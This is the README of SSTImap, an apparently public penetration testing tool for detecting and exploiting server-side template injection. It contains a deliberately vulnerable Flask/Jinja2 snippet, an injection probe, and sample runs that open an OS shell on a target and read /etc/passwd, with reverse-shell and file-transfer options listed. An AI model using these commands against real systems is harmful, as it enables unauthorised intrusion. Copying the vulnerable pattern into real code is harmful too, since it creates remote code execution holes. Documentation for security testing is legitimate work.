SSTImap
======

[![Version 1.3](https://img.shields.io/badge/version-1.3-green.svg?logo=github)](https://github.com/vladko312/sstimap)
[![Python 3.13](https://img.shields.io/badge/python-3.13-blue.svg?logo=python)](https://www.python.org/downloads/release/python-3130/)
[![Python 3.6](https://img.shields.io/badge/python-3.6+-yellow.svg?logo=python)](https://www.python.org/downloads/release/python-360/)
[![GitHub](https://img.shields.io/github/license/vladko312/sstimap?color=green&logo=gnu)](https://www.gnu.org/licenses/gpl-3.0.txt)
[![GitHub last commit](https://img.shields.io/github/last-commit/vladko312/sstimap?color=green&logo=github)](https://github.com/vladko312/sstimap/commits/)
[![Maintenance](https://img.shields.io/maintenance/yes/2025?logo=github)](https://github.com/vladko312/sstimap)

> This project is based on [Tplmap](https://github.com/epinna/tplmap/).

SSTImap is a penetration testing software that can check websites for Code Injection and Server-Side Template Injection vulnerabilities and exploit them, giving access to the operating system itself.

This tool was developed to be used as an interactive penetration testing tool for SSTI detection and exploitation, which allows more advanced exploitation. More payloads for SSTImap can be found [here](https://github.com/vladko312/extras).

Sandbox break-out techniques came from:
- James Kettle 's [Server-Side Template Injection: RCE For The Modern Web App][5]
- Other public researches [\[1\]][1] [\[2\]][2]
- Contributions to Tplmap [\[3\]][3] [\[4\]][4].

This tool is capable of exploiting some code context escapes and blind injection scenarios. It also supports _eval()_-like code injections in Python, Ruby, PHP, Java and generic unsandboxed template engines.

Differences with Tplmap
-----------------------

Even though this software is based on Tplmap's code, backwards compatibility is not provided.
- Added two new techniques for SSTI detection and exploitation
- Interactive mode (`-i`) allowing for easier exploitation and detection
- Simple evaluation payloads as response markers in case of payload reflection
- Added new payloads for generic templates, to test all contexts use `--generic`
- Base language _eval()_-like shell (`-x`) or single command (`-X`) execution
- Added new payload for _Smarty_ without enabled `{php}{/php}`.
- Added new payload for newer versions of _Twig_. Payload for older version is available as `Twig_v1`.
- User-Agent can be randomly selected from a list of desktop browser agents using `-A`
- SSL verification can now be enabled using `--verify-ssl`
- Short versions added to many arguments
- Some old command line arguments were changed, check `-h` for help
- Code is changed to use newer python features
- Burp Suite extension temporarily removed, as _Jython_ doesn't support Python3

Server-Side Template Injection
------------------------------

This is an example of a simple website written in Python using [Flask][6] framework and [Jinja2][7] template engine. It integrates user-supplied variable `name` in an unsafe way, as it is concatenated to the template string before rendering.

```python3
from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

@app.route("/page")
def page():
    name = request.args.get('name', 'World')
    # SSTI VULNERABILITY:
    template = f"Hello, {name}!<br>\n" \
                "OS type: {{os}}"
    return render_template_string(template, os=os.name)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
```

Not only this way of using templates creates XSS vulnerability, but it also allows the attacker to inject template code, that will be executed on the server, leading to SSTI.

```
$ curl -g 'https://www.target.com/page?name=John'
Hello John!<br>
OS type: posix
$ curl -g 'https://www.target.com/page?name={{7*7}}'
Hello 49!<br>
OS type: posix
```

User-supplied input should be introduced in a safe way through rendering context:

```python3
from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

@app.route("/page")
def page():
    name = request.args.get('name', 'World')
    template = "Hello, {{name}}!<br>\n" \
               "OS type: {{os}}"
    return render_template_string(template, name=name, os=os.name)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
```

Predetermined mode
------------------

SSTImap in predetermined mode is very similar to Tplmap. It is capable of detecting and exploiting SSTI vulnerabilities in multiple different templates.

After the exploitation, SSTImap can provide access to code evaluation, OS command execution and file system manipulations.

To check the URL, you can use `-u` argument:

```
$ ./sstimap.py -u https://example.com/page?name=John

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║ _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 1.3.0
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal. 
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program


[*] Testing if GET parameter 'name' is injectable   
[*] Smarty plugin is testing rendering with tag '*'
...
[*] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] SSTImap identified the following injection point:

  GET parameter: name
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, python code

[+] Rerun SSTImap providing one of the following options:
    --os-shell                   Prompt for an interactive operating system shell
    --os-cmd                     Execute an operating system command.
    --eval-shell                 Prompt for an interactive shell on the template engine base language.
    --eval-cmd                   Evaluate code in the template engine base language.
    --tpl-shell                  Prompt for an interactive shell on the template engine.
    --tpl-cmd                    Inject code in the template engine.
    --bind-shell PORT            Connect to a shell bind to a target port
    --reverse-shell HOST PORT    Send a shell back to the attacker's port
    --upload LOCAL REMOTE        Upload files to the server
    --download REMOTE LOCAL      Download remote files
```

Use `--os-shell` option to launch a pseudo-terminal on the target.

```
$ ./sstimap.py -u https://example.com/page?name=John --os-shell

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║ _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 1.3.0
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal. 
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program


[*] Testing if GET parameter 'name' is injectable
[*] Smarty plugin is testing rendering with tag '*'
...
[*] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] SSTImap identified the following injection point:

  GET parameter: name
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, python code

[+] Run commands on the operating system.
posix-linux $ whoami
root
posix-linux $ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

To get a full list of options, use `--help` argument.

Interactive mode
----------------

In interactive mode, commands are used to interact with SSTImap. To enter interactive mode, you can use `-i` argument. All other arguments, except for the ones regarding exploitation payloads, will be used as initial values for settings.

Some commands are used to alter settings between test runs. To run a test, target URL must be supplied via initial `-u` argument or `url` command. After that, you can use `run` command to check URL for SSTI.

If SSTI was found, commands can be used to start the exploitation. You can get the same exploitation capabilities, as in the predetermined mode, but you can use `Ctrl+C` to abort them without stopping a program.

By the way, test results are valid until target url is changed, so you can easily switch between exploitation methods without running detection test every time.

To get a full list of interactive commands, use command `help` in interactive mode.

Supported template engines
--------------------------

SSTImap supports multiple template engines and _eval()_-like injections.

New payloads are welcome in PRs. Check out the [tips](https://github.com/vladko312/extras#developing-plugins) to speed up development.

| Engine                                                                             | RCE | Tech | Language   | Type                                                   |
|------------------------------------------------------------------------------------|-----|------|------------|--------------------------------------------------------|
| Freemarker                                                                         | ✓   | REBT | Java       | Default                                                |
| SpEL (Spring EL code eval)                                                         | ✓   | REBT | Java       | Default                                                |
| Velocity                                                                           | ✓   | REBT | Java       | Default                                                |
| Nunjucks                                                                           | ✓   | REBT | JavaScript | Default                                                |
| JavaScript (code eval)                                                             | ✓   | REBT | JavaScript | Default                                                |
| JavaScript-based generic templates                                                 | ✓   | REBT | JavaScript | Default                                                |
| Twig (>=1.41; >=2.10; >=3.0)                                                       | ✓   | REBT | PHP        | Default                                                |
| PHP (code eval)                                                                    | ✓   | REBT | PHP        | Default                                                |
| PHP-based generic templates                                                        | ✓   | REBT | PHP        | Default                                                |
| Jinja2                                                                             | ✓   | REBT | Python     | Default                                                |
| Python (code eval)                                                                 | ✓   | REBT | Python     | Default                                                |
| Python-based generic templates                                                     | ✓   | REBT | Python     | Default                                                |
| ERB                                                                                | ✓   | REBT | Ruby       | Default                                                |
| Slim                                                                               | ✓   | REBT | Ruby       | Default                                                |
| Ruby (code eval)                                                                   | ✓   | REBT | Ruby       | Default                                                |
| Generic evaluating templates                                                       | ×   | Reb_ | *          | Default                                                |
| doT                                                                                | ✓   | REBT | JavaScript | Generic                                                |
| EJS                                                                                | ✓   | REBT | JavaScript | Generic                                                |
| Marko                                                                              | ✓   | REBT | JavaScript | Generic                                                |
| Pug                                                                                | ✓   | REBT | JavaScript | Generic                                                |
| Smarty                                                                             | ✓   | REBT | PHP        | Generic                                                |
| Cheetah                                                                            | ✓   | REBT | Python     | Generic                                                |
| Mako                                                                               | ✓   | REBT | Python     | Generic                                                |
| Tornado                                                                            | ✓   | REBT | Python     | Generic                                                |
| Dust (<= dustjs-helpers@1.5.0)                                                     | ✓   | REBT | JavaScript | Legacy                                                 |
| Twig (<=1.19)                                                                      | ✓   | REBT | PHP        | Legacy                                                 |
| [expr-eval](https://huntr.com/bounties/1-npm-expr-eval)                            | ✓   | REBT | JavaScript | [Extra](https://github.com/vladko312/extras/tree/main) |
| [CVE-2025-1302](https://gist.github.com/nickcopi/11ba3cb4fdee6f89e02e6afae8db6456) | ✓   | REBT | JavaScript | [Extra](https://github.com/vladko312/extras/tree/main) |
| [CVE-2022-23614](https://nvd.nist.gov/vuln/detail/CVE-2022-23614)                  | ✓   | R_BT | PHP        | [Extra](https://github.com/vladko312/extras/tree/main) |
| [CVE_2024_6386](https://sec.stealthcopter.com/wpml-rce-via-twig-ssti/)             | ✓   | REBT | PHP        | [Extra](https://github.com/vladko312/extras/tree/main) |

Techniques: (R)endered, (E)rror-based, (B)oolean error-based blind and (T)ime-based blind; Lowercase letter marks partially supported technique

More plugins and payloads can be found in [SSTImap Extra Plugins](https://github.com/vladko312/extras) repository.

Burp Suite Plugin
-----------------

Currently, Burp Suite only works with Jython as a way to execute python2. Python3 functionality is not provided.

Future plans
------------

If you plan to contribute something big from this list, inform me to avoid working on the same thing as me or other contributors.

- [ ] Add more payloads for different engines
- [ ] Parse raw HTTP request from file
- [ ] Variable dumping functionality
- [ ] Blind/side-channel value extraction
- [ ] Better documentation (or at least any documentation)
- [ ] Short arguments as interactive commands?
- [ ] JSON/plaintext API modes for scripting integrations?
- [ ] Better integration for Python scripts
- [ ] Multipart POST data type support
- [ ] Modules for more customisable requests (second order, reset, non-HTTP)
- [ ] Payload processing scripts
- [ ] Better config functionality
- [ ] Saving found vulnerabilities
- [ ] Reports in HTML or other format
- [ ] Multiline language evaluation?
- [ ] Avoid platform dependency in payloads
- [ ] Update NodeJS payloads as process.mainModule may be undefined
- [x] Spider/crawler automation (by [fantesykikachu](https://github.com/fantesykikachu))
- [x] Automatic languages and engines import
- [x] More POST data types support
- [x] Make template and base language evaluation functionality more uniform
- [x] Argument to remove escape codes?

[1]: https://artsploit.blogspot.co.uk/2016/08/pprce2.html
[2]: https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/
[3]: https://github.com/epinna/tplmap/issues/9
[4]: http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine
[5]: http://blog.portswigger.net/2015/08/server-side-template-injection.html
[6]: http://flask.pocoo.org/
[7]: http://jinja.pocoo.org/
